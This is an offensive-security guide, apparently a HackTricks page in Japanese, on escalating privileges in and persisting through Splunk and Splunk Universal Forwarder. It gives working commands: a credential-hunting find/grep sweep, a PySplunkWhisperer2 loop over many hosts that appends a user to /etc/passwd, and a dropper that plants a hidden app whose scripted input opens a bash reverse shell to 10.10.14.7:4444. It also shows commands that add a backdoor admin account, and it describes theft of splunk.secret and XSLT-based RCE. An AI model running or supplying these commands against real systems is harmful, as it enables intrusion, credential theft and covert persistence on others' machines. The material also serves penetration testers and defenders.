# Splunk LPE and Persistence

{{#include ../../banners/hacktricks-training.md}}

マシンを**内部**または**外部から enumeration**している際に、**Splunk が稼働している**こと（通常、Web UI は **8000**、management API は **8089**）を見つけた場合、有効な認証情報は、app のインストール、scripted inputs、または management actions を通じて、しばしば **code execution** に変えることができます。Splunk が **root** として稼働している場合、これは頻繁に即時の **privilege escalation** につながります。

一般的な remote attack surface、enumeration、または app-upload RCE path のみが必要な場合は、以下を確認してください。

{{#ref}}
../../network-services-pentesting/8089-splunkd.md
{{#endref}}

**すでに root** で、Splunk service が localhost のみに listen していない場合は、**Splunk password hashes** の窃取、**encrypted secrets** の復元、またはローカルや複数の forwarders にわたって persistence を維持するための **malicious app** の push も実行できます。

## Interesting Local Files

Splunk または Splunk Universal Forwarder が稼働している host に侵入した場合、通常、以下の path が最も興味深いものです。
```bash
export SPLUNK_HOME=/opt/splunk
[ -d /opt/splunkforwarder ] && export SPLUNK_HOME=/opt/splunkforwarder

find "$SPLUNK_HOME/etc" -maxdepth 4 \( -name passwd -o -name authentication.conf -o -name user-seed.conf -o -name inputs.conf -o -name app.conf -o -name serverclass.conf -o -name outputs.conf -o -name splunk.secret \) 2>/dev/null

grep -RniE 'pass4SymmKey|sslPassword|bindDNPassword|clear_password|token' "$SPLUNK_HOME/etc" 2>/dev/null
```
重要な artifacts:

- **`$SPLUNK_HOME/etc/passwd`**: ローカルの Splunk users と password hashes。
- **`$SPLUNK_HOME/etc/auth/splunk.secret`**: 複数の `.conf` files に保存された secrets を Splunk が encrypt するために使用する key。
- **`$SPLUNK_HOME/etc/system/local/user-seed.conf`**: 初期 admin bootstrap file。gold images や provisioning のミスで有用。`etc/passwd` がすでに存在する場合は無視される。
- **`$SPLUNK_HOME/etc/apps/*/{default,local}/inputs.conf`**: scripted inputs が一般的に有効化される場所。
- **`$SPLUNK_HOME/etc/deployment-apps/`** または **`$SPLUNK_HOME/etc/apps/`**: persistent app を隠したり、すでに distribution されているものを確認したりするのに適した場所。

## Splunk Universal Forwarder Agent Exploit 概要

詳細については [https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/](https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/) を確認してください。ここでは summary のみを示します。

**Exploit の概要:**
Splunk Universal Forwarder（UF）を標的とする exploit により、**agent password** を持つ attackers は、agent が実行されている systems 上で arbitrary code を execute でき、環境の大部分が compromise される可能性があります。

**なぜ機能するのか:**

- UF management service は通常 **TCP 8089** で exposed されています。
- Attackers は API に authenticate し、forwarder に **malicious app bundle** を install するよう指示できます。
- 同じ primitive を local では **LPE**、remote では **RCE** に使用できます。
- **SplunkWhisperer2** などの public tooling は app bundle を自動的に作成し、Linux targets 用に payloads を適応できます。

**Password を recover する一般的な方法:**

- documentation、scripts、shares、または deployment automation 内の cleartext credentials。
- `$SPLUNK_HOME/etc/passwd` 内の password hashes を取得し、offline cracking を行う。
- `user-seed.conf` などの golden images や provisioning の残骸。

**Impact:**

- compromise された各 host 上での SYSTEM/root-level code execution。
- persistent apps、backdoors、または ransomware の deployment。
- data が forward される前に telemetry を disable または tamper すること。

**Exploitation の Example command:**
```bash
for i in `cat ip.txt`; do python PySplunkWhisperer2_remote.py --host $i --port 8089 --username admin --password "12345678" --payload "echo 'attacker007:x:1003:1003::/home/:/bin/bash' >> /etc/passwd" --lhost 192.168.42.51;done
```
**利用可能な公開 exploit:**

- [https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2](https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2)
- [https://www.exploit-db.com/exploits/46238](https://www.exploit-db.com/exploits/46238)
- [https://www.exploit-db.com/exploits/46487](https://www.exploit-db.com/exploits/46487)

## Scripted Inputs または Malicious Apps による Persistence

`root`/`splunk` として **filesystem write access** がある場合、または authenticated access によって App を install できる場合、非常に信頼性の高い Persistence mechanism は、**scripted input** を含む **custom app** を配置することです。Splunk 自身の documentation では、scripted inputs は app directory 配下に配置し、`inputs.conf` から enable することが想定されています。

一般的な layout:
```bash
/opt/splunk/etc/apps/.linux_audit/
├── bin/check.sh
└── default/inputs.conf
```
最小限の `inputs.conf`:
```ini
[script://$SPLUNK_HOME/etc/apps/.linux_audit/bin/check.sh]
disabled = 0
interval = 60
sourcetype = auditd
```
Quick Linux dropper:
```bash
APP="$SPLUNK_HOME/etc/apps/.linux_audit"
mkdir -p "$APP/bin" "$APP/default"
printf '#!/bin/bash\nbash -c "bash -i >& /dev/tcp/10.10.14.7/4444 0>&1"\n' > "$APP/bin/check.sh"
printf '[script://$SPLUNK_HOME/etc/apps/.linux_audit/bin/check.sh]\ndisabled = 0\ninterval = 60\n' > "$APP/default/inputs.conf"
chmod +x "$APP/bin/check.sh"
"$SPLUNK_HOME/bin/splunk" restart
```
Notes:

- 同じ trick は **Universal Forwarder** でも `/opt/splunkforwarder/etc/apps/` を使って機能します。
- Attackers は、明らかに malicious な app を作成する代わりに、正規の add-on を変更して blend in することがよくあります。
- **deployment server** では、`deployment-apps/` 内に malicious app を配置すると **fleet-wide persistence** になります。これは forwarder が定期的に poll して更新された app を download し、適用時に再起動することが多いためです。

## Credential Theft and Admin Takeover

Splunk の local files を read できる場合、通常は **Splunk admin access** の回復と **encrypted service credentials** の回復という、2 つの有効な目標があります。

### Password hashes and local users

Splunk は local authentication data を `etc/passwd` に保存します。deployment によっては、その file を crack することで、web UI と management API で使用できる credentials を回復できます。

すでに有効な **admin** credentials があり、Splunk が **native** authentication backend を使用している場合、CLI 自体を persistence に使用できます。
```bash
"$SPLUNK_HOME/bin/splunk" edit user admin -password 'Winter2026!' -auth admin:'OldPassword!'
"$SPLUNK_HOME/bin/splunk" add user svc_backup -password 'Winter2026!' -role admin -auth admin:'OldPassword!'
```
### `splunk.secret` と暗号化された値

Splunk は、複数の設定ファイルに保存される機密値を保護するために、`etc/auth/splunk.secret` を使用します。**secret** と関連する **`.conf` ファイル**の両方を盗み出せれば、次の情報を復元または再利用できることがあります。

- `pass4SymmKey` などの forwarder/indexer shared secrets
- `sslPassword` などの TLS private-key passwords
- `bindDNPassword` などの LDAP bind credentials

Splunk admin password 自体を crack できない場合でも、これは **lateral movement** に役立ちます。

### `user-seed.conf` の悪用

`user-seed.conf` は、初回起動時、または `etc/passwd` が存在しない場合にのみ読み込まれます。そのため稼働中の box ではあまり有用ではありませんが、次のような環境では非常に興味深い対象になります。

- compromised installation templates
- container images
- unattended provisioning workflows
- Splunk が自動的に再初期化される appliances

このような場合、`splunk hash-passwd` で生成した `HASHED_PASSWORD` を仕込むことで、redeployment 後に admin access を静かに取り戻せます。

## Splunk Queries の悪用

詳細については [https://blog.hrncirik.net/cve-2023-46214-analysis](https://blog.hrncirik.net/cve-2023-46214-analysis) を確認してください。

最近有効な technique の 1 つは、脆弱な Splunk Enterprise versions において **user-supplied XSLT** を悪用し、low-privileged authenticated account を **`splunk` user としての OS command execution** に変えることです。

High-level flow:

1. Splunk に authenticate します。
2. preview/upload functionality を通じて悪意のある **XSL** file を upload します。
3. upload した stylesheet を **dispatch** directory から使用して、Splunk に search results を render させます。
4. XSLT payload を使用して file を write するか、Splunk の search pipeline 経由で execution を trigger します（たとえば `runshellscript` などの internal functionality に到達します）。

重要な offensive takeaway は、この path が **app upload を必要としない post-auth RCE** である点です。Linux では通常、**`splunk`** account を取得します。この user は application tree を所有していることが多く、secrets を read でき、shell loss 後も存続する persistent apps を plant できます。

Exploitation 中に使用される representative path は次のとおりです。
```text
/opt/splunk/var/run/splunk/dispatch/<sid>/shell.xsl
```
Splunk が過剰な権限で実行されている場合、または `splunk` ユーザーが危険なスクリプト、書き込み可能な service unit、あるいは不適切な `sudo` ルールにアクセスできる場合、これは明確な **LPE** chain になります。

## 参考資料

- [https://advisory.splunk.com/advisories/SVD-2023-1104](https://advisory.splunk.com/advisories/SVD-2023-1104)
- [https://www.huntress.com/blog/beware-of-traitorware-using-splunk-for-persistence](https://www.huntress.com/blog/beware-of-traitorware-using-splunk-for-persistence)
{{#include ../../banners/hacktricks-training.md}}
